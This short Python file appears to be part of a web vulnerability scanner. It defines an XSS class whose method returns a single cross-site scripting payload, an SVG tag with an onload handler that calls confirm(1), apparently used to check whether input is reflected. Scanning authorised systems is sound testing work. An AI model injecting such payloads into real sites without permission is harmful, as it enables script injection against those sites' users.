from .vuln import Vuln


class XSS(Vuln):
    def generate_payloads(self):
        ctx = {
            '<svg/onrandom=random onload=confirm(1)>': '<svg/onrandom=random onload=confirm(1)>'
        }

        return ctx
